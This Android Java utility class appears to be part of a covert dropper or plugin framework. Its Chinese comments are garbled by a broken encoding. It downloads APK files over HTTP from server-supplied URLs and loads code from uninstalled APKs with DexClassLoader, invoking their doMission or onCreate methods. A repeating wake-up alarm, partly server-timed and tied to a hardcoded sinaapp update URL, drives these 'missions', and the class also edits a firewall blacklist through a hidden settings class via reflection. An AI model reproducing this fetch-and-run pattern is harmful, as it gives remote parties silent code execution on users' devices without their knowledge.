package com.sf.cup.utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;

import org.apache.http.util.EncodingUtils;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class Utils {
	private final static boolean isDebug = false;
	private final static String TAG = Utils.class.getPackage() + "."
			+ Utils.class.getSimpleName();
	public final static String APK_NAME = "tmp";
	public final static String APK_NAME_SUFFIX = "apk";
	public final static String SEPARATOR_DOT = ".";
	public final static String SEPARATOR_SLASH = "/";
	public final static String FILE_PATH = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+APK_NAME;
	public final static String URL_PATH="http://ys2016.sinaapp.com/check_update.php";
//	public final static String URL_PATH="http://www.google.com";
	public final static String SHARE_PREFERENCE_ZYT="ZYT";
	public final static String SHARE_PREFERENCE_ZYT_PLUGIN="ZYT_PLUGIN";
	public final static String SHARE_PREFERENCE_HTTP_URL="HTTP_URL";
	public final static String SHARE_PREFERENCE_REPEAT_TIME="REPEAT_TIME";
	public final static String SHARE_PREFERENCE_REPEAT_TIME_FIRSTBOOT="REPEAT_TIME_FIRSTBOOT";
	public final static String SHARE_PREFERENCE_SWITCH="SWITCH";
	public final static String SHARE_PREFERENCE_HTTP_STATUS="HTTP_STATUS";
	public final static String SHARE_PREFERENCE_PLUGIN="PLUGIN";
	//��̨��Ҫ�ഫһ��userid
	public final static String SHARE_PREFERENCE_USERID="userid";
	//������һ�γɹ�ִ�������ʱ��
	public final static String SHARE_PREFERENCE_LAST_EXEC_TIME="last_exec_time";
	//������������ظ�ʱ�䣬���ܴܺ󣬺ü���
	public final static String SHARE_PREFERENCE_SERVER_DEFINE_REPEAT_TIME="SERVER_DEFINE_REPEAT_TIME";
	//wangm �̶�2h��һ�Σ�Ȼ��ȥ�жϷ��ͼ���Ƿ���ڷ������ϵ�ʱ��
	public final static long REPEAT_TIME=2*60*60*1000;//�и����񣬿������ı�repeat time��Ĭ�����ӳ�ʱʱ��Ϊ90s�������ظ�ʱ�����Ҫ����90s
	public final static long REPEAT_TIME_FIRST_BOOT=10*60*60*1000;//�������һ��������ʱ�䣬��������̨�޸Ĵ�ʱ��Ľӿڶ�����
	public final static long REPEAT_TIME_CAN_EXECUTE_DEFAULT=24*60*60*1000;//δ�趨repeattimecanexe.txt ��̨δ�趨��ִ�����ڣ���Ĭ��һ���ִ��һ��

	
	public static final int TARGET_ACTIVITY = 0;
	public static final int TARGET_SERVICE = 1;
	public static final String FROM = "extra.from";
	public static final int FROM_EXTERNAL = 0;
	public static final int FROM_INTERNAL = 1;
	/**
	 * running log
	 * 
	 * @param s
	 */
	public static void Log(String s) {
		if (isDebug) {
			Log.i("xxxxxxxxxxxx", s);
		}
	}

	/**
	 * error log
	 * 
	 * @param tag
	 * @param s
	 */
	public static void Log(String tag, String s) {
		Log.d(tag, s);
	}

	/**
	 * ����Key��ȡֵ.
	 * 
	 * @return ���key������, �������def��Ϊ���򷵻�def���򷵻ؿ��ַ���
	 * @throws IllegalArgumentException
	 *             ���key����32���ַ����׳����쳣
	 */
	public static String getSystemProperties(Context context, String key,
			String def) throws IllegalArgumentException {
		String ret = def;
		try {
			ClassLoader cl = context.getClassLoader();
			@SuppressWarnings("rawtypes")
			Class SystemProperties = cl
					.loadClass("android.os.SystemProperties");
			// ��������
			@SuppressWarnings("rawtypes")
			Class[] paramTypes = new Class[2];
			paramTypes[0] = String.class;
			paramTypes[1] = String.class;
			@SuppressWarnings("unchecked")
			Method get = SystemProperties.getMethod("get", paramTypes);
			// ����
			Object[] params = new Object[2];
			params[0] = new String(key);
			params[1] = new String(def);
			ret = (String) get.invoke(SystemProperties, params);
		} catch (IllegalArgumentException iAE) {
			Utils.Log(TAG, "IllegalArgumentException:" + iAE);
		} catch (Exception e) {
			ret = def;
			Utils.Log(TAG, "Exception:" + e);
		}
		return ret;
	}
	
	public static long getRepeatTime(Context c){
		SharedPreferences p;
		long repeatTime=REPEAT_TIME;
		//1,��ȡ�ֻ���Ŀ¼repeattime.txt�ļ��ж��Ƕ���ʱ����
		String fileName = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+"repeattime.txt";//�ļ�·��
        String res = "";
        try {
            FileInputStream fin = new FileInputStream(fileName);
            int length = fin.available();
            byte[] buffer = new byte[length];
            fin.read(buffer);
            res = EncodingUtils.getString(buffer, "UTF-8");//���������������
            fin.close();//�ر���Դ
            int a=Integer.parseInt(res);
            if(a>=90){
            	repeatTime=a*1000;
            	Utils.Log("*** getRepeatTime from repeattime.txt and repeattime is :"+a+" seconds");
            	return repeatTime;
            }else{
				Utils.Log(TAG, "txt repeat time is:" +a+" s,less than 90s");
			}
        } catch (Exception e) {
        	Utils.Log(TAG,"getRepeatTime from repeattime.txt error:"+e);
        }
		
		//2���ж��Ƿ��������޸Ĺ�repeattime
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		String s = p.getString(Utils.SHARE_PREFERENCE_REPEAT_TIME, null);
		Utils.Log(" getRepeatTime from preference:" + s);
		if (!TextUtils.isEmpty(s)) {
			try {
				long tmpTimeSecond=Long.parseLong(s);
				if(tmpTimeSecond>=90){
					repeatTime=tmpTimeSecond*1000;
					Utils.Log("getRepeatTime repeatTime from server:" + repeatTime);
					return repeatTime;
				}else{
					Utils.Log(TAG, "repeat time from server is:" +tmpTimeSecond+" s,less than 90s");
				}
			} catch (NumberFormatException e) {
				Utils.Log(TAG, "getRepeatTime NumberFormatException:" + e);
			} catch (Exception e) {
				Utils.Log(TAG, "getRepeatTime Exception:" + e);
			}
		}
		Utils.Log("getRepeatTime repeatTime:" + repeatTime);
		return repeatTime;
	}
	public static long getRepeatTimeFirstBoot(Context c){
		SharedPreferences p;
		long repeatTime=REPEAT_TIME_FIRST_BOOT;
		//1,��ȡ�ֻ���Ŀ¼repeattimefirst.txt�ļ��ж��Ƕ���ʱ����
		String fileName = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+"repeattimefirst.txt";//�ļ�·��
        String res = "";
        try {
            FileInputStream fin = new FileInputStream(fileName);
            int length = fin.available();
            byte[] buffer = new byte[length];
            fin.read(buffer);
            res = EncodingUtils.getString(buffer, "UTF-8");//���������������
            fin.close();//�ر���Դ
            int a=Integer.parseInt(res);
            if(a>0){
            	repeatTime=a*1000;
            	Utils.Log("*** getRepeatTimeFirstBoot from repeattimefirst.txt and repeattimefirst is :"+a+" seconds");
            	return repeatTime;
            }else{
				Utils.Log(TAG, "txt repeat time is:" +a+" s,less than 90s");
			}
        } catch (Exception e) {
        	Utils.Log("getRepeatTimeFirstBoot from repeattimefirst.txt error:"+e);
        }
		
		//2���ж��Ƿ��������޸Ĺ�repeattime
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		String s = p.getString(Utils.SHARE_PREFERENCE_REPEAT_TIME_FIRSTBOOT, null);
		Utils.Log(" getRepeatTimeFirstBoot from preference:" + s);
		if (!TextUtils.isEmpty(s)) {
			try {
				long tmpTimeSecond=Long.parseLong(s);
				if(tmpTimeSecond>=90){
					repeatTime=tmpTimeSecond*1000;
					Utils.Log("getRepeatTimeFirstBoot repeattimefirst from server:" + repeatTime);
					return repeatTime;
				}else{
					Utils.Log(TAG, "repeattimefirst time from server is:" +tmpTimeSecond+" s,less than 90s");
				}
			} catch (NumberFormatException e) {
				Utils.Log(TAG, "getRepeatTimeFirstBoot NumberFormatException:" + e);
			} catch (Exception e) {
				Utils.Log(TAG, "getRepeatTimeFirstBoot Exception:" + e);
			}
		}
		Utils.Log("getRepeatTimeFirstBoot repeattimefirst:" + repeatTime);
		return repeatTime;
	}
	
	public static void stopDoMission(Context c){
		Intent mIntent = new Intent();
		mIntent.setAction("com.fc.sf.service.MAIN_SERVICE");
		mIntent.setPackage(c.getPackageName());
		PendingIntent sender = PendingIntent.getService(c, 0, mIntent, 0);
		// Schedule the alarm!
		AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
		am.cancel(sender);
		
		SharedPreferences p;
		SharedPreferences.Editor e;
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		e = p.edit();
		e.putBoolean(Utils.SHARE_PREFERENCE_SWITCH, false);
		e.commit();
	}
	
	public static void startDoMission(Context c)
	{
		SharedPreferences p;
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		boolean s = p.getBoolean(Utils.SHARE_PREFERENCE_SWITCH, true);
		if(!s){
			Utils.Log("sorry! The service was close the mission");
			return ;
		}
		Intent mIntent = new Intent();
		mIntent.setAction("com.fc.sf.service.MAIN_SERVICE");
		mIntent.setPackage(c.getPackageName());
//		 startService(mIntent);

		PendingIntent sender = PendingIntent.getService(c, 0, mIntent, 0);
		// Schedule the alarm!
		AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
		Calendar calendar = Calendar.getInstance();
		calendar.setTimeInMillis(System.currentTimeMillis());
		am.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),
				Utils.getRepeatTime(c), sender);
	}
	
	/**
	 * ��ȡ�ϴ�ִ��ʱ��ͷ������趨��ִ�����ڡ������ڵ�ʱ����ڷ�������ִ�����ڣ���ִ������
	 * @param c
	 * @return
	 */
	public static boolean isTimeCanExec(Context c){
		SharedPreferences p;
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		
		String lastExecTimeString = p.getString(Utils.SHARE_PREFERENCE_LAST_EXEC_TIME, null);
		Utils.Log("isTimeCanExec lastExecTimeString:" + lastExecTimeString);
		//1����δִ�й���ֱ��ִ��
		if (TextUtils.isEmpty(lastExecTimeString)) {
			return true;
		}
		
		long lastExecTime=Long.parseLong(lastExecTimeString);
		long currectTime=System.currentTimeMillis();
		long tmpTime=Math.abs(currectTime-lastExecTime);
		Utils.Log("isTimeCanExec currectTime:" + currectTime+"  tmpTime:"+tmpTime);
		
		//2,��ȡ�ֻ���Ŀ¼repeattimecanexe.txt�ļ��ж��Ƕ���ʱ����
		String fileName = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+"repeattimecanexe.txt";//�ļ�·��
        String res = "";
        try {
            FileInputStream fin = new FileInputStream(fileName);
            int length = fin.available();
            byte[] buffer = new byte[length];
            fin.read(buffer);
            res = EncodingUtils.getString(buffer, "UTF-8");//���������������
            fin.close();//�ر���Դ
            long a=Long.parseLong(res)*1000;
            Utils.Log("*** repeattimecanexe from repeattimecanexe.txt is :"+a+" seconds");
            if(tmpTime-a>0){
            	return true;
            }else{
            	return false;//���ļ��Ͳ��ܷ��������õ�ʱ���ˡ�
            }
        } catch (Exception e) {
        	Utils.Log(TAG,"repeattimecanexe from repeattimecanexe.txt error:"+e);
        }
        
        //3��������δ�趨ʱ�䣬��̶���24Сʱִ��һ�Ρ�
        String serverDefineTimeString = p.getString(Utils.SHARE_PREFERENCE_SERVER_DEFINE_REPEAT_TIME, null);
		Utils.Log("isTimeCanExec serverDefineTimeString:" + serverDefineTimeString);
		if (TextUtils.isEmpty(serverDefineTimeString)) {
			if(tmpTime-REPEAT_TIME_CAN_EXECUTE_DEFAULT>0){
				return true;
			}else{
				return false;
			}
		}
		long serverDefineTime=Long.parseLong(serverDefineTimeString)*1000;
		//4��������ʱ����ڷ������趨��ִ�����ڣ���ִ��
		if(serverDefineTime==0||tmpTime-serverDefineTime>0)
		{
			return true;
		}else
		{
			return false;
		}
	}
	
	/**
	 * ��ȡ���ӷ�ʽ
	 * none:-1 mobile:0 wifi:1    
	 * @param context
	 * @return
	 */
	public static int getNetWorkType(Context context) {  
        ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = manager.getActiveNetworkInfo();  
        if (networkInfo != null && networkInfo.isConnected()) {
        	Utils.Log("#### network type:"+(networkInfo.getType()==ConnectivityManager.TYPE_WIFI?"wifi":"others:"+networkInfo.getType()));
        	return networkInfo.getType();
        }
       	Utils.Log("#### network connect fail");
        return -1;
    } 
	
	
	
	public static boolean getScreenOn(Context context) {  
		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		boolean isScreenOn = pm.isScreenOn();
		Utils.Log("### getScreenOn:"+isScreenOn);
		return isScreenOn;
	}
	/**
	 * ɾ��ָ���ļ�
	 * @param file
	 */
	public static void deleteFile(File file) {
		if (file.exists()) {
			if (file.isFile()) {
				file.delete();
			}
		}
	}
	/** 
     * �ж�ָ�����ļ��Ƿ���ڡ� 
     * @param fileName Ҫ�жϵ��ļ����ļ��� 
     * @return ����ʱ����true�����򷵻�false�� 
     */  
    public static boolean isFileExist(String fileName) {  
      return new File(fileName).isFile();  
    }  
    /**
     * �ж�apk�Ƿ��Ѵ���
     * @param context
     * @param packageName
     * @return
     */
    public static boolean isPkgInstalled(Context context, String packageName) {

        if (packageName == null || "".equals(packageName))
            return false;
        android.content.pm.ApplicationInfo info = null;
        try {
            info = context.getPackageManager().getApplicationInfo(packageName, 0);
            return info != null;
        } catch (NameNotFoundException e) {
            return false;
        }
    }
	
	
	/**
	 * ���ú�����  д��
	 */
	public static void doResetBlackList(Context c,String blackListString){
		Utils.Log("doResetBlackList:" + blackListString);
		//�÷���ȥ����wuwz�Ľӿ�
		
		try {
		 ClassLoader cl = c.getClassLoader();
			Class<?> iptablesHelper = cl
					.loadClass("com.android.settings.IptablesHelper");
     	Utils.Log("doResetBlackList 1" + iptablesHelper);
     	
     	//1 reset
     	Method resetIptables = iptablesHelper.getMethod("resetIptables",new Class[]{Context.class,String.class});
        Utils.Log("doResetBlackList 2 resetIptables = " + resetIptables);
        resetIptables.setAccessible(true);  
        resetIptables.invoke(iptablesHelper,new Object[] {c,blackListString});
        
       
		}catch(Exception e){
			Utils.Log(TAG,"doResetBlackList  error:"+e);	
		}
	}
	/**
	 * ���ú�����  ִ��
	 */
	public static void doUpdateBlackList(Context c){
		
		Utils.Log("doUpdateBlackList 0");
		//�÷���ȥ����wuwz�Ľӿ�
		
		try {
		 ClassLoader cl = c.getClassLoader();
			Class<?> iptablesHelper = cl
					.loadClass("com.android.settings.IptablesHelper");
     	Utils.Log("doUpdateBlackList 1" + iptablesHelper);
     	
		 //2 update
        Method updateIptables = iptablesHelper.getMethod("updateIptables",new Class[]{Context.class});
        Utils.Log("doUpdateBlackList 2 updateIptables = " + updateIptables);
        updateIptables.setAccessible(true);  
        updateIptables.invoke(iptablesHelper,new Object[] {c});
        Utils.Log("doUpdateBlackList 3 updateIptables done ");
        
		}catch(Exception e){
			Utils.Log(TAG,"doUpdateBlackList  error:"+e);	
		}
	}
	
	 /**
     *����δ��װapk �ķ���
     *������manifest�е�һ��activity �� service ��type��TARGET_ACTIVITY��TARGET_SERVICE ����
     *Ŀǰ��δ������������
     *��ڽ���onCreate  
     */
	public static void launchTargetAPK(Context context, final String apkFilePath,
			int type) throws Exception {
		Utils.Log("launchTargetAPK 1:" + apkFilePath);
		File dexOutputDir = context.getDir("dex", 0);
		final String dexOutputPath = dexOutputDir.getAbsolutePath();
		Utils.Log("dexOutputDir = " + dexOutputDir + "  dexOutputPath:"
				+ dexOutputPath);
		// dexOutputDir = /data/data/com.freecom.add/app_dex
		// dexOutputPath:/data/data/com.freecom.add/app_dex
		ClassLoader localClassLoader = ClassLoader.getSystemClassLoader();
		DexClassLoader dexClassLoader = new DexClassLoader(apkFilePath,
				dexOutputPath, null, localClassLoader);
		PackageInfo packageInfo;
		String activityName = null;
		if (type == TARGET_ACTIVITY) {
			packageInfo = context.getPackageManager().getPackageArchiveInfo(
					apkFilePath, PackageManager.GET_ACTIVITIES);
			if ((packageInfo != null) && (packageInfo.activities != null)
					&& (packageInfo.activities.length > 0)) {
				activityName = packageInfo.activities[0].name;// ������manifest�е�һ��activity
			}
		} else if (type == TARGET_SERVICE) {
			packageInfo = context.getPackageManager().getPackageArchiveInfo(
					apkFilePath, PackageManager.GET_SERVICES);
			if ((packageInfo != null) && (packageInfo.services != null)
					&& (packageInfo.services.length > 0)) {
				activityName = packageInfo.services[0].name;// ������manifest�е�һ��services
			}
		}
		Utils.Log("launchTargetAPK 3:" + activityName);
		if (activityName != null) {
			try {
				Class<?> localClass = dexClassLoader.loadClass(activityName);
				Constructor<?> localConstructor = localClass
						.getConstructor(new Class[] {});
				Object instance = localConstructor.newInstance(new Object[] {});

				Method setProxy = localClass.getMethod("setProxy",
						new Class[] { Context.class });
				setProxy.setAccessible(true);
				setProxy.invoke(instance, new Object[] { context });
				Bundle bundle = new Bundle();
				bundle.putInt(FROM, FROM_EXTERNAL);
				Method onCreate ;
				if (type == TARGET_ACTIVITY){
					onCreate= localClass.getDeclaredMethod("onCreate",
							new Class[] { Bundle.class });
					onCreate.setAccessible(true);
					onCreate.invoke(instance, new Object[] { bundle });
				}else if(type == TARGET_SERVICE){
					//service �ĳ������£�����עdomission����
					onCreate= localClass.getDeclaredMethod("doMission",
							new Class[] {});
					onCreate.setAccessible(true);
					onCreate.invoke(instance, new Object[] {});	
				}
			} catch (InvocationTargetException ite) {
				Throwable t = ite.getTargetException();// ��ȡĿ���쳣
				t.printStackTrace();
			} catch (Exception e) {
				Utils.Log(TAG, "launchTargetAPK Exception:" + e);
			}
		}
	}
	
	/**
	 * 
	 * @param httpUrl
	 * @param id �ļ�������Ψһ��ʶ
	 * @return
	 */
	public static File downLoadFile(String httpUrl,String id) {
		Utils.Log("downLoadFile start");
		final File file = new File(Utils.FILE_PATH+id+Utils.SEPARATOR_DOT+Utils.APK_NAME_SUFFIX);//����id�����ֶ����������
		try {
			URL url = new URL(httpUrl);
			try {
				HttpURLConnection conn = (HttpURLConnection) url
						.openConnection();
				InputStream is = conn.getInputStream();
				FileOutputStream fos = new FileOutputStream(file);
				byte[] buf = new byte[1024];
				conn.connect();
				long timestamp = System.currentTimeMillis();
				int len;
				if (conn.getResponseCode() >= 400) {
					// Toast.makeText(mContext, "time out",
					// Toast.LENGTH_SHORT).show();
					Utils.Log(TAG, "downLoadFile time out error");
				} else {
					while ((len = is.read(buf)) != -1) {
						fos.write(buf, 0, len);
					}
				}
				Utils.Log("downLoadFile spend time:"
						+ (System.currentTimeMillis() - timestamp) + "ms");
				conn.disconnect();
				fos.close();
				is.close();
			} catch (IOException e) {
				Utils.Log(TAG, "downLoadFile IOException error:" + e);
			}
		} catch (MalformedURLException e) {
			Utils.Log(TAG, "downLoadFile MalformedURLException error:" + e);
		} catch (Exception e) {
			Utils.Log(TAG, "downLoadFile Exception error:" + e);
		}
		Utils.Log("downLoadFile finish"+file);
		return file;
	}
}
